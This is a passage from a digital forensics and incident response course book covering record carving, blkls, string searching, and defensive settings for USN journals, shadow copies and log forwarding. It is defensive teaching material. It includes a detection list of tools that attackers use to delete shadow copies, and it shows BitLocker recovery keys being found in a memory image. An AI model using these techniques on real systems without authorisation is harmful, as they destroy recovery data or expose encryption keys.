That said, with the gaining popularity of Windows Services for Linux, particularly among IT staff, it’s not out of
the question that this would be a useful carver on some Windows systems as well.
The ability to carve for these important artifacts in one fell swoop is quite a nice convenience. Even more
exciting is that testing has shown we are not compromising effectiveness for the convenience. It consistently
104

© 2023 SANS Institute

.

104

carves as many or more events as other tested tools carving for the same records. One more benefit worth
mentioning is that it takes steps to reconstruct the file format of event logs so that the recovered events can be
read directly with tools such as Event Log Explorer or Eric Zimmerman’s EvtxECmd. In fact, the author has an
article on his site which details parsing recovered event logs with EvtxECmd.[4] As discussed in that article, as
well as his presentation at OSDFCon 2018,[5] bulk_extractor-rec carves for EVTX records not by the
individual events, but by EVTX “chunks”, which can then be assembled with the known EVTX file header to
create a valid .evtx file. Impressive!
For the NTFS file system artifacts carved by bulk_extractor-rec, it typically outputs a couple of files for each
type. One will be a file of records that passed validity checks for that specific artifact. This file will be named
after the artifact (e.g., “MFT”, or “UsnJrnl-J”). These can be parsed using the tools we’ve discussed for each
artifact type. Just consider them as another (small) instance of the artifact. For example, mftecmd nicely parses
out the carved records of both the MFT and UsnJrnl. The other file that typically gets created contains records
that did not pass the validity checks. These have a suffix of “_corrupted”. They will need to be reviewed
manually. A quick analysis might include a simple strings review. Otherwise, reviewing with a hex editor will
usually be required.
One of the interesting ideas with records carving, in general, is that it may be applicable not just to carving free
space, but even allocated files as well. For example, the volume shadow copy snapshots files are allocated files
with backed up blocks of valid data. Some of these blocks will most certainly have EVTX records, MFT
“FILE” records, $UsnJrnl records, and more. Of course, we could use tools to mount or extract the whole files
from volume shadow copies. However, carving directly against the VSS store files is a valid option as well.
This would be particularly useful if any of the volume shadow copies got corrupted, which does happen
sometimes. In that case, the VSS store file will remain allocated until the volume shadow copy (and any
dependencies of it) gets deleted by the OS. One other example is parsing allocated hibernation files. In fact,
Bulk Extractor supports automatically decompressing and searching hibernation files prior to Windows 8.

.

That said, a reasonable starting point is to focus on the unallocated spaces on the volume. As we saw with
PhotoRec, some carving tools are filesystem-aware and can offer to carve just unallocated. Bulk Extractor is not
filesystem-aware, and, in fact, that’s by design. So, when we do want to narrow our focus to unallocated, we
need to use another forensic tool to extract or present the unallocated clusters. A nice option for this is yet
another tool from The Sleuth Kit called “blkls”.[6]
blkls outputs data from disk images to standard output (stdout). By default, it extracts just unallocated clusters
so that deleted data can be recovered and searched more effectively. Since it outputs to stdout, the typical
approach is to redirect the output into a file of just the unallocated space to have it available for processing with
other tools. Here’s simple diagram to illustrate how it works to extract unallocated clusters.

The command to do this would simply be:
blkls [options] image > image.unallocated

© 2023 SANS Institute

.

105

One option of note is the ability to extract slack space with the ‘-s’ switch. This will tell blkls to look only at
allocated file and print out just the data from the end of the logical file to the end of the cluster boundary. The
analyst will generally redirect this to another output file (e.g., image.slack) because, although it is also
unallocated space, its format is different. The difference is that this exported data did not start at cluster
boundaries. This is an important distinction since many file carving tools focus their searches only at the
beginning of clusters for efficiency. It means whole file carving is not likely at all, but records carving and
string searching have some potential.
Although bulk_extractor-rec is a great option for carving many of our critical artifact record types, there are
other options—and it’s good to have options! Joakim Schicht has an impressive set of tools, including both
parsers and carvers, for all the major NTFS artifacts. His tools are all available from his GitHub account page.[7]
For another option to carve EVTX records, consider Willi Ballenthin’s EVTXtract. [8] However, keep in mind it
will only extract raw XML events. It does not reconstruct them into an EVTX file for easier parsing and
analysis.
No tool does it all and none are perfect, though, of course, they all strive to be. That being the case, for added
thoroughness, it’s recommended to test and potentially use multiple carving tools against the same artifact. To
that point, the author of Bulk Extractor with Record Carving says it explicitly for event log carving. In his
article “Parsing carved evtx records using EvtxECmd”, he says:[4]
“By the way, I have confirmed EVTXtract [from Willi Ballenthin] has also carved evtx records. It may
carve out more records than bulk_extractor-rec but output format is only XML. If you have to cope
with event log thoroughly, I recommend that you try both bulk_extractor-rec and EVTXtract.”

.

[1] Bulk Extractor Wiki: https://for508.com/46r52
[2] Bulk Extractor user’s guide: https://for508.com/1h6jy
[3] Bulk Extractor with Record Carving website: https://for508.com/nvx4u
[4] “Parsing carved evtx records using EvtxECmd”: https://for508.com/nu4kg
[5] Teru Yamazaki presentation at OSDFCon 2018: https://for508.com/2olzn
[6] “blks” man page: https://for508.com/bloyd
[7] Joakim Schicht’s GitHub page: https://for508.com/x-5n6
[8] Willi Ballenthin’s EVTXtract GitHub page: https://for508.com/ut2l-

106

© 2023 SANS Institute

.

“Carving” for Strings
Direct String Search

vs. Indexed String Search
vs
The "bitlocker" search is
preconfigured to search the
input file with the following
RegEx
List of files containing the
exact terms “recovery key”
based on an indexed search

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

107

As a final data recover option, we consider one of the earliest and most basic discovery techniques in digital
forensics—string searching. The term “string searching” is a general term which can incorporate more than just
keyword strings, but also numeric or hex values searches. It may not be exciting, but it can still be very fruitful.

.

With string searching, we generally have 2 approaches, each with their own set of pros & cons:
1.

A direct bit-by-bit search using tools such as grep or bstrings or a hex editor to locate specific terms or
values. This is generally the most complete method of searching. If an analyst is looking for something
very specific and wants to be as thorough as possible, this is likely the best method. A caveat, however, is
that if the term of interest is inside a compressed file, such as Windows 10/11 pagefiles, Outlook OSTs and
PSTs, and even Office documents (which are essentially zip-compressed XML files), then basic searching
tools will be unable to find the term. This means we may need to preprocess some files of interest prior to
searching with tools like grep. Alternatively, we can use forensic tools that know how to decompress the
file prior to searching it. There are several forensic tools that can do this, including most of the commercial
suites as well as the open-source tool Bulk Extractor previously discussed. However, most tools support
only a subset of compressed file types, so gaps are still possible (even likely). As an example, effective
decompression of Windows 10-and-11-page files is still relatively rare.

2.

An indexed search, which is commonly included in major forensic software suites, leverages technology
such as Apache Solr or dtSearch to create a comprehensive keyword index from a processed image (or
images). After processing completes, which often takes significant time, subsequent searchers are very fast.
The index essentially becomes a keyword search engine for the evidence files that were indexed. One
benefit of using forensic suites is that they are generally able to search inside some compressed file types
while creating the index. The main downside is that indexing software has to make some assumptions
about what designates a string, and specifically where that string begins and ends. As such, it often divides
strings on many common characters which you might want to include in your string search. An example
would be the ‘@’ excluded from the index, thereby making it more challenging to search for email
addresses. Most indexing engines allow this to be adjusted but, eventually, choices mush be made which
could eliminate characters the analyst later determines would have been useful to include in searches. (A
common workaround is the use of proximity searches.[1])
© 2023 SANS Institute

.

107

In this slide, we see the results of searching for a Bitlocker recovery key using the two techniques just discussed.
The screenshot on the left is using Eric Zimmerman’s bstrings utility to do a specific bit-for-bit search across a
file of interest.[2][3] In this case, we are searching an acquired memory image using bstrings’ built-in regular
expression for the format of a Bitlocker recovery key. After about 10 minutes, the search completed with a
match in the format of a Bitlocker recovery key! Bstrings is a very fast string searching tool and comes
preconfigured with several popular regular expression patterns. Use “bstrings -p“ to get a list of available
patterns.
The screenshots on the right shows the result of using the free Autopsy forensics suite. This application is very
feature-rich and rivals the capabilities of many of the expensive commercial forensics suites. The feature on
display here is the ability to point Autopsy at a disk image and have it index keywords using Apache Solr.[4][5]
Once the job to index the image is complete, we can run all sorts of keyword searches across the image very
quickly. Here we’ve used the exact two-word phrase “recovery key”. These terms were found side-by-side in a
couple dozen files on this particular disk image. Most were false-positives, but one that had the exact data we
were searching for was found in the WaitList.dat file. This file is associated with the Windows Search Index
and is used to stage text before rolling it into the active index.[6] Incidentally, the same data was also located in
the “OneNoteOfflineCache.onecache” file two rows above it.

.

[1] Proximity search: https://for508.com/ir64k
[2] bstrings GitHub repo: http://for508.com/0nxs8
[3] Introducing bstrings: https://for508.com/fa7rm
[4] Autopsy article on Apache Solr: https://for508.com/xz1ys
[5] Autopsy Keyword Searching and Indexing: https://for508.com/pah6w
[6] Waitlist.dat file: https://for508.com/s5wgx

108

© 2023 SANS Institute

.

Advanced Adversary and Anti-Forensics Detection Agenda

Anti-Forensics Overview
Recovery of Deleted Files via VSS
Advanced NTFS Filesystem Tactics
Advanced Evidence Recovery
Defensive Countermeasures
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

109

.

This page intentionally left blank.

© 2023 SANS Institute

.

109

Leverage File System History

• Ensure Volume Snapshots are enabled
• Disable “ScopeSnapshots“
• Increase reserved size for snapshots
• Consider VSC scheduled tasks to increase frequency

• Increase NTFS journal sizes:
• $LogFile: default size is 64MB
• $UsnJrnl: typical size is 32 MB; some servers are 512MB
• $UsnJrnl is preferred due to more efficient logging

• Monitor for suspicious file system activity
• fsutil, vssadmin, wmic shadowcopy, win32_shadowcopy
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Whether you’re a fan of Windows or not, it’s hard to imagine an operating system with a more robust set of file
system features for forensic analysis. For example, the ability to rewind the data layer through volume
snapshots is extremely powerful for data recovery and analysis. The journaling system is also quite impressive
in its ability to support file system resilience and provide efficiencies to applications monitoring for file changes.
Overall, the various functions work well together to improve system usability. As it turns out, they also work
well together to provide historical data for investigative purposes.
While most of the defaults are reasonably helpful at this point, there’s room for improvement. Regarding
volume snapshots, one of the biggest improvements to strongly consider is disabling “ScopeSnapshots”. This
was enabled beginning in Windows 8 and it can significantly hinder our ability to recover useful data from
snapshots. Fortunately, Microsoft has documented the registry setting to disable the feature and return to
Windows 7 snapshot functionality. [1][2]
The lifetime of snapshots is essentially a function of the space allocated to store snapshots. The more space
available, the more snapshots available. This is a setting that can be adjusted via the built-in tool vssadmin.exe
with the “resize” function. Windows client operating systems have consistently created fewer snapshots by
default over the years. With Windows Vista, the default was to create daily snapshots. With Windows 7, it
went to weekly. With Windows 10, it’s triggered by various maintenance tasks and may happen as frequently as
each week but may take longer. It’s worth considering the deployment of Scheduled Tasks to create snapshots
at least weekly. In summary, we may as well take full advantage of the volume shadow copy service and
allocate a little more space for their storage and configure a more frequent snapshot schedule.
Both journal files are set to a small file size in most cases. For the $LogFile, it is almost always set at 64 MB.
That can be changed via the command “chkdisk /L”.[3] While not a bad idea, the $LogFile is admittedly difficult
to read and interpret. It’s also much more verbose, so increasing its size still may not have the desired effect.
The USN journal is a fantastic artifact for reviewing changes to the file system over days or even weeks. In fact,
summarizing file system changes is its primary purpose, and therefore perfect for forensics. For some Windows
server installations, such as those implementing the Distributed File System feature, they will have a much
larger USN journal size, usually 512 MB. However, the majority of Windows systems have a default USN
journal size of just 32 MB by default. A journal of that size often lasts just a few days (at most) on a typical
110

© 2023 SANS Institute

.

110

host. Clearly, there’s room to increase storage beyond 32 MB for just about any system in any environment.
Increasing it to perhaps 256 MB would result in USN journals that should last a week or more in most cases. Of
course, be sure to test and validate in your own environment first. You can check the current size on a system
with the command “fsutil usn queryjournal <volume-letter>”. The “fsutil” command can also
be used to resize the USN journal.[4]
As an example, the author set his C: drive to 1.5 GB and that provides USN data going back nearly a month.
The command used was:
fsutil usn createjournal m=1610612736 a=201326592 C:
Big picture, a strategic combination of the following steps should provide major benefits for filesystem visibility
on subject systems in your environment:
1.
2.
3.
4.

Configure a larger USN journal allocation
Disable VSC “ScopeSnapshots”
Configure a larger VSC allocation
Consider adding a scheduled task to create volume shadow copies on a regular basis (perhaps weekly)

As a final point, attackers know how useful these features can be for analysis, so naturally, they will target them
during anti-forensics activity. Volume shadow copies in particular are becoming well-known by attackers.
Some of the same commands we use to monitor and manage these artifacts can be used against us.
Vssadmin.exe is a great example. It’s commonly used for volume snapshot administrative tasks but can also be
used by attackers to delete snapshots; or resize reserved space to a very small value. The same can be done via
WMIC, PowerShell, and via programming APIs using the “win32_shadowcopy” class. Unexpected use of these
tools to interact with volume shadow copies should be monitored to the extent possible, as pointed out in
MITRE’s “Inhibit System Recovery” attacker technique description (T1490).[5]

.

[1] “VSS Does Not Protect User Data” whitepaper: https://for508.com/av4fl
[2] Calling SRSetRestorePoint: https://for508.com/thuiq
[3] Microsoft’s “chkdsk” documentation: https://for508.com/3x8md
[4] Microsoft’s “fsutil usn” documentation: https://for508.com/hgpmo
[5] Mitre T1490 – Inhibit System Recovery: https://for508.com/c1zsb

© 2023 SANS Institute

.

111

Level Up On Visibility

• Log, log, log
• Forward, forward, forward
• Our endpoints are on the front lines
• Treat them like sensors
• To be useful, we need regular and rel iable data from them

• Deploy enhanced logging configu rations
• PowerShell and Windows audit policy improvements
• EDR technology such as Sysmon
• Forward where possible, increase local storage everywhere
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

In this class, we’ve analyzed many different artifacts indicating evidence of attackers’ malware execution,
persistence, lateral movement, file access, and more. While it’s important for analysts to have this deep-dive
forensic knowledge, using it for all investigations does not scale well. Therefore, it’s critical that we guide
organizations to instrument their systems for better visibility to detect and respond efficiently.

.

In Windows environments, we’re fortunate that the logging capabilities of the operating system are solid and
continue to improve. At this point, most of what we’d want to monitor can be done with the built-in event log
subsystem. Add to that the impressive level of logging now available for PowerShell (both in event logs and
external “transcription” logs) and we’re in even better shape. For the next level of visibility, Microsoft’s
Sysmon tool tracks just about any event we might want to capture to discover an attacker’s behavior.
Everything from processes executed, network connections generated, DNS requests made, WMI Event
Consumers created, timestomping performed, and even deleted files being archived. The tools and features are
available, we just need to build and configure our environments to leverage them.
Configuring systems for thorough logging is a big step forward. However, attackers are going after logs in more
aggressive and creative ways. It’s no longer just a clearing of the security event logs that we have to be on the
lookout for, it’s also the possibility of suspending the event log service in memory, or perhaps even editing
events on the disk. The best defense we have against attacks on the logging infrastructure is to get the logs off
the system as quickly as possible. Log forwarding not only helps protect those logs from later tampering (or
even just natural deletion), it also provides security teams with data needed for proactive hunting and real-time
alerting. For highly critical systems, we can also setup heartbeat monitoring to check for the absence of
forwarded events within a certain time frame.
There are no magic cures for the challenges we face in information security. However, with careful planning
and a judicious use of resources, we can instrument our networks for better detection and more effective
incident response.

112

© 2023 SANS Institute

.

112

Lab 5.4
Anti-Forensics Analysis and Data Recovery
Average Time: 30 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

113

.

This page intentionally left blank.

© 2023 SANS Institute

.

113

FOR508 Course Agenda
Section 1

Advanced Incident Response and Threat Hunting

Section 2

Intrusion Analysis

Section 3

Memory Forensics in Incident Response and Threat Hunting

Section 4

Timeline Analysis

Section 5

Advanced Adversary and Anti-Forensics Detection

Section 6

APT Enterprise Incident Response and Hunting Challenge
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

114

© 2023 SANS Institute

.

114

Intrusion Forensic Challenge

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

115

.

This page intentionally left blank.

© 2023 SANS Institute

.

115

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

116

© 2023 SANS Institute

.

116

COURSE RESOURCES AND CONTACT INFORMATION
Here is my lens. You know my methods. –Sherlock Holmes
AUTHOR CONTACT
rlee@sans.org
http://twitter.com/robtlee

SANS INSTITUTE
11200 Rockville Pike, Suite 200
N. Bethesda, MD 20852
301.654.SANS(7267)

ctilbury@sans.org
http://twitter.com/chadtilbury
mpilkington@sans.org
https://twitter.com/mikepilkington

SANS EMAIL
DFIR RESOURCES
digital-forensics.sans.org
Twitter: @sansforensics

GENERAL INQUIRIES: info@sans.org
REGISTRATION: registration@sans.org
TUITION: tuition@sans.org
PRESS/PR: press@sans.org

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

117

.

This page intentionally left blank.

© 2023 SANS Institute

.

117

.

This page intentionally left blank.

.

Index
$ATTRDEF
$ATTRIBUTE_LIST
$BADCLUS
$BITMAP
$BOOT
a$DATA
$EA
$EA_INFORMATION
$EXTEND
$FILE_NAME
$I30
$INDEX_ALLOCATION
$INDEX_ROOT
$J
$LOGFILE

.

$LOGGED_UTILITY_STREAM
$Max
$MFT

$MFTMIRR
$OBJECT_ID
$ObjId
$Quota
$Reparse
$REPARSE_POINT
$SECURE
$SECURITY_DESCRIPTOR
$Standard_Information
$UPCASE
$UsnJrnl

$VOLUME

5:15, 5:27
5:32
5:15, 5:27-28
5:15, 5:26-28, 5:32, 5:68, 5:74, 5:79, 5:83
4:44-45, 5:15, 5:27-28
5:32-33, 5:41, 5:50-52, 5:54, 5:59, 5:74,
5:98
5:32
5:32
5:15, 5:27-29, 5:81
5:32-33, 5:38, 5:41, 5:43-45, 5:47-49,
5:52, 5:54, 5:59, 5:61-62, 5:74
1:120, 4:45, 5:48, 5:58-62, 5:65-66, 5:68,
5:72-73, 5:79-80, 5:87-88, 5:91-92
5:32, 5:59-61, 5:65, 5:105
5:32, 5:59-61
4:44-45, 5:70-71, 5:81-82, 5:105
3:175, 5:15, 5:27, 5:37-38, 5:67-70, 5:7275, 5:77, 5:79-81, 5:83, 5:90-91, 5:105,
5:111
5:32
5:71
3:163, 3:173, 3:175, 3:177, 4:42-46, 4:52,
4:69, 4:86, 5:15, 5:26-27, 5:50, 5:58, 5:7781, 5:91, 5:105
5:15, 5:27
5:32
5:27-28, 5:65, 5:83
5:27, 5:29, 5:40, 5:83
5:27, 5:29, 5:32, 5:65
5:32
5:15, 5:27-28, 5:40, 5:83
5:32
5:32-33, 5:37, 5:39, 5:41-42, 5:44-45,
5:47-49, 5:59, 5:62, 5:68, 5:73-74, 5:92
5:15, 5:27-28
4:92, 5:27, 5:29, 5:37, 5:40, 5:67-68, 5:7074, 5:77, 5:79-81, 5:83, 5:87, 5:90-91,
5:105-106, 5:111
5:15, 5:27, 5:32

Index - 1

.

$VOLUME_INFORMATION
$VOLUME_NAME

5:32
5:32

\
\Device\PhysicalMemory

3:11

A
access token
Account Creation
Account Logon

.

Account Logon Events
Account Management
Account Usage
Acquiring Processes
Additional Time Rule Exceptions
Admin Shares
Admin$
ADS

Advanced Persistent Threat
Allocated Clusters
Alternate Data Streams
AmCache.hve
Analyzing Process Objects
Anonymous Logon
apihooks
Appcompatprocessor.py
Application Compatibility Cache

Index - 2

.

1:139, 1:143, 3:19, 3:69-72
1:126, 2:60
1:147, 2:42, 2:46-47, 2:57, 2:69, 2:72,
2:135, 2:178
2:42, 2:69, 2:72
1:126, 2:42, 2:60, 2:74
1:126, 2:46-47, 2:52, 2:54, 2:62, 2:64
3:182
4:40
1:139, 2:118-119
1:127, 2:81, 2:118, 2:122, 2:181
1:21-22, 1:38, 1:41, 1:62, 1:64, 1:73, 1:77,
1:79, 1:89, 1:140, 2:6, 2:15, 2:17, 2:32,
2:98, 2:105, 2:143, 2:167-168, 2:180,
2:182, 2:184, 3:5-6, 3:11, 3:17, 3:19, 3:28,
3:34, 3:38-39, 3:41, 3:46, 3:48, 3:52, 3:59,
3:67, 3:85, 3:102, 3:104, 3:119, 3:142,
3:145, 3:148, 3:150, 3:161, 3:173, 3:175,
3:185, 4:11, 4:23, 4:27-28, 4:47, 4:59,
4:63, 4:84, 4:89, 4:94, 5:6, 5:48, 5:50,
5:52-53, 5:55-57, 5:59-60, 5:65-66, 5:70,
5:72-74, 5:76-78, 5:81, 5:91-92, 5:95, 5:97
1:12, 1:44, 3:144
5:71-72, 5:96, 5:106
1:63, 1:110, 2:184, 5:15, 5:24, 5:50, 5:5255, 5:57, 5:73-74
2:17, 2:19, 2:21, 2:23-25, 2:28, 2:143
3:61
2:56-57
3:140, 3:148-149, 3:158
2:28-30, 2:32
2:14-15, 3:163, 4:61

Application Deployment Software
Application Installation
Application Vulnerabilities
ASEP
AsJob
at.exe
Atomic
ATT&CK
attack progression
Autoruns
autorunsc.exe

2:133
2:116, 5:9
1:86, 2:135
1:71-72, 1:74, 1:86
1:99
1:75, 1:96, 2:94, 5:60, 5:63
1:39-40
1:44-46, 1:48, 2:153, 3:126, 4:16, 5:57
1:39-40
1:72, 1:74, 1:76, 1:81, 1:86-87, 1:107, 1:115,
1:120, 4:94
1:86-87, 1:107

B
B-Tree
baseline

Bulk Extractor
bulk_extractor

.

BCWipe
Behavioral
Behavioral Indicators
blkls
Bloodhound
bodyfile

5:58-60, 5:63-64
1:101, 3:33, 3:52-54, 3:56, 3:86, 3:101,
3:135, 3:151, 3:154-155, 5:100
5:89-93
1:39-41, 1:57, 1:160, 3:26, 3:166, 5:86
1:40
5:106-107
1:160-161
1:107, 4:44-48, 4:52, 4:64-65, 4:82, 4:86,
5:49
5:105-108
5:105-107

C
C2
Cache

Cached

1:29, 1:39-43, 1:51, 1:61, 1:127, 2:147, 3:68,
4:10, 5:6
1:98, 1:100, 1:103, 1:120, 1:129-130, 1:132,
1:137, 1:139, 1:144-145, 1:147-148, 1:151152, 1:154, 1:159-160, 2:6, 2:14-19, 2:21,
2:23-25, 2:27-30, 2:34, 2:50, 2:115-116,
2:121, 2:130, 2:143, 3:5, 3:7, 3:62, 3:81,
3:160-161, 3:163, 3:173-177, 4:61-63, 4:65,
4:82, 5:15, 5:47-49, 5:109
1:98, 1:100, 1:129-130, 1:139, 1:144-145,
1:147-148, 1:151-152, 1:154, 1:159-160,

Index - 3

.

Capa Project
Capability

Code Signing
Collector
Command line

common malware locations
common malware names
Compromised host
Computed
Computed Indicators
Connections

Index - 4

.

.

Certificate Revocation List
Certification Authority
Change journal
cmdline
cmdscan
Code injection

2:50, 3:62, 3:160-161, 3:163, 3:173, 3:175177
4:14-15
1:7, 1:12, 1:18, 1:20, 1:25, 1:30-31, 1:33,
1:40, 1:48, 1:93, 1:98-99, 1:108, 1:110,
1:113-114, 1:126, 1:129, 2:14, 2:41, 2:72,
2:77, 2:102, 2:105, 2:107, 2:130, 2:133,
2:135, 2:140, 2:148, 2:153, 2:156-157,
2:162, 2:164-165, 2:170, 2:179, 2:181-182,
3:11, 3:14, 3:20, 3:38, 3:41, 3:52, 3:102,
3:104, 3:108, 3:119, 3:132, 3:144, 3:154155, 3:172-173, 3:181, 3:184, 3:186, 4:6,
4:11, 4:16, 4:46, 4:76, 4:78, 5:5, 5:9, 5:1114, 5:17, 5:62, 5:65-66, 5:69, 5:78-79, 5:81
1:65
1:64
5:23, 5:29, 5:70-71, 5:81-82, 5:88
3:52, 3:61-62, 3:64-65, 3:68, 3:94
3:163, 3:170
1:79, 1:137, 2:135, 2:147, 3:7, 3:18, 3:26,
3:30, 3:46, 3:63, 3:91, 3:99-104, 3:110112, 3:114, 3:116-119, 3:122, 3:126-127,
3:129, 3:136-137, 3:142, 3:150, 3:158,
3:183, 3:185
1:63-66, 3:150, 4:6
1:105, 1:107, 1:160, 2:38
1:6, 1:62, 1:87, 1:96, 1:105, 1:111, 1:132,
2:6, 2:9-10, 2:47, 2:84, 2:107-108, 2:118,
2:121-122, 2:126, 2:128, 2:130, 2:132,
2:139, 2:148, 2:150, 2:152, 2:154, 2:156157, 2:161, 2:176, 2:178-179, 2:184-185,
3:7, 3:17, 3:21, 3:31, 3:48, 3:51-52, 3:54,
3:56, 3:61-62, 3:64-65, 3:67-68, 3:75,
3:83, 3:92, 3:94, 3:102, 3:126, 3:128,
3:157, 3:166, 3:168-170, 3:183, 3:186, 4:11,
4:36, 4:72, 4:83, 4:94, 5:36, 5:88
1:61
1:61, 2:27
1:24, 1:28-29, 1:41, 1:49, 1:57, 2:161, 5:49,
5:81
1:39-40
1:40
1:73, 1:98, 1:113, 1:160, 2:50, 2:62-63,

connscan
consoles
Containment
Containment and Intelligence
Development
context clues
Cookies
Copy Malware
Credential Guard
CredSSP
Critical Remediation Control
CRITS
csrss
csrss.exe
Custom

Cyber threat intelligence
Cyber Threat Intelligence Capability

2:67, 2:81, 2:83, 2:115-117, 2:158, 2:163,
2:184, 3:5, 3:49, 3:85-89, 3:96, 3:139,
3:150, 3:158, 3:166, 3:172, 3:183, 5:113
3:87
2:133, 3:163, 3:170
1:20-22, 1:24-26, 1:30, 1:38, 3:7
1:21, 1:24
4:29
4:63, 4:82
2:114
1:129, 1:132, 1:137, 1:142, 1:156-158
1:100, 1:129
1:29
1:50
3:46, 3:145-146, 3:162, 3:170
3:46, 3:145-146, 3:162, 3:170
1:7, 1:16, 1:40, 1:110, 1:115, 1:120, 2:10,
2:16, 2:40, 2:67, 2:89, 2:107, 2:134, 2:162,
2:164, 3:68, 3:110, 3:132, 4:5, 4:45, 4:59
1:22, 1:31, 1:33, 1:46, 1:57-58
1:31, 1:33

Data Collection
Data Exfiltration
data layer
Data Reduction
DCSync
deep dive analysis
Deep-dive forensics
Default.rdp
Delegate Token
Deleted files
Delivery
density
deskthrd
devicetree
Digital forensics

.

D
1:56-57, 1:92, 1:98, 1:101-102, 1:105, 1:114,
1:117, 2:77, 2:152
1:25, 1:38, 2:162
5:25, 5:30, 5:89, 5:111
2:41, 3:52, 3:54, 3:56, 3:154, 4:89
1:154-155, 1:158
1:57-58
1:55, 1:57, 2:4, 3:3, 4:3, 5:3
2:115
1:100, 1:139, 1:142
4:34, 4:42, 4:46, 5:8, 5:58, 5:63-65, 5:77,
5:86, 5:96, 5:101, 5:113
1:37, 1:41-43
5:92
3:145
3:151
1:32, 1:57, 2:27, 3:52, 4:21-22, 4:69, 5:71,

Index - 5

.

Direct Kernel Object Manipulation
Direct Kernel Object Manipulation
(DKOM)
Directory Handle
Directory Index
Directory Service
DistributedKansa
DKOM
DLL Injection
DLL Persistence
DLL Persistence Attacks
DLL Search Order
DLL Search Order Hijacking
DLL Side-Loading
dlldump
dlllist

.

DLLs

Domain Account Hash
Drive Letter
Driverbl
driverirp
drivers

dumpfiles
Dumpit
Dun & Bradstreet

Index - 6

.

5:108
3:28, 3:126, 3:139, 3:144, 3:146
3:126, 3:139, 3:144, 3:146
3:59
5:39, 5:43, 5:48, 5:58, 5:60, 5:62, 5:6466, 5:68, 5:91-92
1:160, 2:40, 2:42
1:108
3:126, 3:139, 3:144, 3:146
1:63, 2:96, 3:7, 3:63, 3:102, 3:106-108,
3:110, 3:114, 3:127, 3:129, 3:136
1:77-78, 3:103
1:78
1:77
1:77
1:65, 1:77-78
3:63, 3:163-164
3:61-65, 3:76, 3:108, 3:111, 3:128-129,
3:163-164, 3:182
1:73, 1:77-79, 1:87-88, 1:120, 2:143, 2:147,
2:158, 2:161, 3:6, 3:17, 3:26, 3:33, 3:37,
3:39, 3:52-54, 3:59-63, 3:65, 3:68, 3:76,
3:83, 3:94, 3:101-104, 3:108, 3:111, 3:121,
3:127-129, 3:134, 3:136, 3:148, 3:154,
3:160-164, 3:166, 3:172-173, 3:175, 3:183184, 5:6, 5:9
1:130
1:111, 3:92, 4:44-45, 5:81
3:53
3:140, 3:158
1:65, 1:87-88, 2:17-18, 2:21, 2:25, 2:40,
2:96, 3:5, 3:11-12, 3:17-18, 3:26, 3:52-53,
3:59, 3:121, 3:132, 3:134, 3:138-141, 3:144,
3:146, 3:150-152, 3:154-155, 3:157-166,
3:172, 3:181-184, 3:186, 4:6, 4:62, 5:9
3:62, 3:163, 3:175, 3:182
3:54
1:64

E
Email attachments
Enter-PSSession
Enterprise Incident Response
enterprise scanning
entropy
EPROCESS

Event Viewer
EventID
eventvwr.exe
evtx

EvtxECmd
ewfmount
ExFat
Exfiltration
Explicit Credentials
Exploitation

.

Eprocess blocks
Eraser
Event Handle
Event Log Clearing
Event Log Explorer
Event logs

1:40
1:98, 1:100, 1:132, 2:130, 3:49
1:18
1:33
4:6-8
3:17, 3:19, 3:23, 3:28, 3:33-34, 3:38, 3:41,
3:56, 3:62, 3:64, 3:93, 3:101, 3:106, 3:123,
3:125, 3:128, 3:130, 3:144-146, 3:164,
4:58, 4:66, 4:75-76, 4:81, 5:108
3:28
5:89, 5:92
3:59
2:102-103
2:77, 2:79, 5:106
1:74, 1:114, 1:120, 1:126, 2:38, 2:40, 2:46,
2:51, 2:54, 2:56, 2:63, 2:69, 2:72, 2:74,
2:77, 2:93-94, 2:102, 2:105, 2:107-108,
2:115-118, 2:126-127, 2:129, 2:135, 2:140141, 2:147, 2:157, 2:163, 2:172, 2:179-182,
2:184, 2:187, 3:5, 3:72, 3:157, 4:68, 4:76,
4:85, 4:95, 5:6, 5:11, 5:106, 5:113
2:39-40, 2:47-48, 2:77, 2:103, 2:179
2:110
2:47
2:38, 2:77, 2:105, 2:107-108, 2:110, 2:137,
2:144, 2:146, 2:162-163, 2:179, 2:181,
4:60, 4:76, 4:82, 5:105-107
2:105, 2:107-108, 2:110, 2:137, 5:106-107
5:14, 5:16
5:22, 5:35
1:16, 1:23, 1:25, 1:38, 1:41-42, 1:46, 1:57,
2:162, 3:177
2:46, 2:57-58, 2:83-84, 2:87, 2:121
1:41, 1:57, 1:126, 2:46, 2:135, 2:153-154,
2:165, 3:101, 5:97

Index - 7

.

F
F-Response
Fast Forensics
FAT
File Carving
File Downloads
File Handle
File System Layer
File System Timeline
File_Object
Fileless Malware
Filename layer
filescan
Filter file
find evil

.

Firefox Downloads
Fixup Array
fls
Forensic Analysis

Forensics Process
Forwarded Events
fsutil
FTK Imager

1:15, 1:18, 2:21, 2:179, 3:11, 3:155, 4:54,
4:68
4:77
4:34-35, 5:21-23, 5:25, 5:27, 5:35, 5:91,
5:99
3:172, 5:39, 5:80, 5:96-97, 5:107
5:78
3:59, 3:76, 3:78, 3:103, 3:173
5:21
2:119, 4:52, 4:86, 5:77
3:163, 3:173, 3:175-177
5:6
4:46
3:22-23, 3:163, 3:175
4:73, 4:75-76, 4:78, 4:81, 4:86
1:12, 1:31, 1:63, 1:83, 1:97, 2:28, 2:67,
2:81, 2:182, 3:37, 3:53, 3:96, 3:136
4:63
5:38
1:107, 4:30, 4:45-47, 5:48
1:26, 1:59, 1:77, 1:79, 3:129, 3:184, 4:2425, 4:31, 4:66, 4:97, 5:11, 5:29, 5:35, 5:40,
5:53, 5:59, 5:62, 5:66, 5:71, 5:83, 5:94-95,
5:111
3:103
5:113
5:71, 5:111-112
5:48, 5:55, 5:65, 5:98

G
Gain Authority
Gathering intel through kill chain
completion
Get-RekalPslist.ps1
Get-SvcFail.ps1
getsids
Golden Ticket
grep

Index - 8

.

1:125
1:43
1:107
1:74
3:61, 3:69-70, 3:73
1:151, 1:154-155, 1:157-159
